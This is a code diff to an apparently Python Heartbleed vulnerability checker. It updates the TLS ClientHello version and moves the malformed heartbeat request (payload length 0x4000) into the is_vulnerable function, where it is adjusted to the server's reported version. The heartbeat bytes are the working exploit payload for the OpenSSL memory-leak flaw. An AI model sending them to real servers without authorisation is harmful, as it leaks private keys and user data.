@@ -23,7 +23,7 @@ def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
 
 hello = h2bin('''
-16 03 02 00  dc 01 00 00 d8 03 02 53
+16 03 03 00  dc 01 00 00 d8 03 03 53
 43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
 bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
 00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
@@ -38,11 +38,6 @@ c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
 00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
 00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
 00 0f 00 01 01                                  
-''')
-
-hb = h2bin(''' 
-18 03 02 00 03
-01 40 00
 ''')
 
 
@@ -92,7 +87,6 @@ def recvmsg(s):
 
 
 def hit_hb(s):
-    s.send(hb)
     while True:
         typ, ver, pay = recvmsg(s)
         if typ is None:
@@ -130,11 +124,18 @@ def is_vulnerable(domain):
     s.send(hello)
     #print 'Waiting for Server Hello...'
     #sys.stdout.flush()
+
+    hb = h2bin('''
+    18 03 03 00 03
+    01 40 00
+    ''')
+
     while True:
         typ, ver, pay = recvmsg(s)
         if typ is None:
             #print 'Server closed connection without sending Server Hello.'
             return None
+        hb=hb[:2] + chr(ver&0xff) + hb[3:]
         # Look for server hello done message.
         if typ == 22 and ord(pay[0]) == 0x0E:
             break
